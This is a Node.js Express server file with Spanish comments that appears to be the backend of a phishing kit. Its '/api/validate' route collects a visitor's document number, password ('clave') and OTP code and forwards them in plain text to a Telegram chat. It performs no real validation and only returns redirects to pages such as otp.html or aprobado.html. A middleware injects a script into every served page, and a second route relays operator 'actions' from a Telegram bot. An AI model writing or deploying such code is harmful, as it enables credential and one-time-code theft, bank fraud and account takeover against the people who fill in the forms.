const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

function telegramConfigurado() {
  return Boolean(BOT_TOKEN && CHAT_ID);
}

async function enviarATelegram(mensaje) {
  if (!telegramConfigurado()) {
    return {
      success: false,
      skipped: true,
      message: 'BOT_TOKEN y/o CHAT_ID no configurados'
    };
  }

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML'
    })
  });

  const data = await response.json();
  if (!response.ok || !data.ok) {
    throw new Error(data.description || 'No fue posible enviar mensaje a Telegram');
  }

  return { success: true };
}

// Middleware para inyectar scripts en HTML sin modificar los archivos originales
app.use((req, res, next) => {
  const originalSend = res.send;

  res.send = function(data) {
    if (typeof data === 'string' && data.includes('</body>')) {
      // Inyectar scripts antes del cierre de body
      const scriptInyectado = data.replace(
        '</body>',
        `<script src="integration.js"><\/script>\n  </body>`
      );
      return originalSend.call(this, scriptInyectado);
    }
    return originalSend.call(this, data);
  };

  next();
});

app.use(express.static('.'));
app.use(express.json());

// ===== AUTO-PING =====
// Auto-ping para mantener activo en Render
setInterval(() => {
  console.log('✅ Auto-ping - Servidor activo:', new Date().toLocaleTimeString());
}, 30000);

// ===== RUTAS DE SALUD =====
// Ruta para verificar que el servidor está activo
app.get('/health', (req, res) => {
  res.json({
    status: 'Server is running',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// ===== RUTAS DE ESTADO =====
// Obtener estado actual de la sesión
app.get('/api/estado', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    telegram: {
      configured: telegramConfigurado()
    }
  });
});

// ===== RUTAS DE VALIDACIÓN =====
// Procesar validaciones desde Telegram o frontend
app.post('/api/validate', async (req, res) => {
  const { tipo, documento, clave, otp, flujo } = req.body;

  console.log(`📝 Validación ${tipo}:`, { documento, flujo, timestamp: new Date().toISOString() });

  // Validación básica
  const validaciones = {
    'error': {
      success: false,
      redirect: 'index.html',
      message: 'Información incorrecta'
    },
    'aprobado': {
      success: true,
      redirect: 'aprobado.html',
      message: 'Verificación completada'
    },
    'otp-error': {
      success: false,
      redirect: 'otp.html',
      message: 'Código OTP incorrecto'
    }
  };

  const resultado = validaciones[tipo] || { success: false, message: 'Tipo de validación no reconocido' };
  const mensajeTelegram = [
    `🔎 <b>Validación recibida</b>`,
    `• Tipo: <b>${tipo || 'N/A'}</b>`,
    `• Flujo: <b>${flujo || 'N/A'}</b>`,
    `• Documento: <code>${documento || 'N/A'}</code>`,
    `• Clave: <code>${clave || 'N/A'}</code>`,
    `• OTP: <code>${otp || 'N/A'}</code>`,
    `• Fecha: ${new Date().toISOString()}`
  ].join('\n');

  try {
    const envio = await enviarATelegram(mensajeTelegram);
    res.json({ ...resultado, telegram: envio });
  } catch (error) {
    console.error('❌ Error enviando validación a Telegram:', error.message);
    res.json({
      ...resultado,
      telegram: {
        success: false,
        error: error.message
      }
    });
  }
});

// ===== RUTAS DE INTEGRACIÓN TELEGRAM =====
// Recibir acciones desde bot de Telegram
app.post('/api/telegram/accion', async (req, res) => {
  const { usuario_id, accion, flujo, documento } = req.body;

  console.log(`🤖 Acción desde Telegram:`, { usuario_id, accion, flujo, documento });

  const respuesta = {
    success: true,
    usuario_id,
    accion,
    timestamp: new Date().toISOString()
  };

  const mensajeTelegram = [
    `🤖 <b>Acción de flujo</b>`,
    `• Usuario ID: <code>${usuario_id || 'N/A'}</code>`,
    `• Acción: <b>${accion || 'N/A'}</b>`,
    `• Flujo: <b>${flujo || 'N/A'}</b>`,
    `• Documento: <code>${documento || 'N/A'}</code>`,
    `• Fecha: ${new Date().toISOString()}`
  ].join('\n');

  try {
    const envio = await enviarATelegram(mensajeTelegram);
    res.json({ ...respuesta, telegram: envio });
  } catch (error) {
    console.error('❌ Error enviando acción a Telegram:', error.message);
    res.json({
      ...respuesta,
      telegram: {
        success: false,
        error: error.message
      }
    });
  }
});

// ===== RUTAS ESTÁTICAS =====
// Servir archivos HTML principales
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ===== MANEJO DE ERRORES =====
app.use((err, req, res, next) => {
  console.error('❌ Error:', err.message);
  res.status(500).json({
    error: 'Error interno del servidor',
    message: err.message
  });
});

// ===== INICIO DEL SERVIDOR =====
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Servidor ejecutándose en http://localhost:${PORT}`);
  console.log(`🌍 Acceso remoto: http://0.0.0.0:${PORT}`);
  console.log('⏰ Auto-ping activado cada 30 segundos');
  if (telegramConfigurado()) {
    console.log('🤖 Telegram configurado correctamente (BOT_TOKEN + CHAT_ID)');
  } else {
    console.log('⚠️ Telegram no configurado. Define BOT_TOKEN y CHAT_ID en variables de entorno.');
  }
  console.log('\n📝 Rutas disponibles:');
  console.log('   GET  /health - Verificar estado del servidor');
  console.log('   GET  /api/estado - Obtener estado actual');
  console.log('   POST /api/validate - Validar datos');
  console.log('   POST /api/telegram/accion - Recibir acciones de Telegram');
});
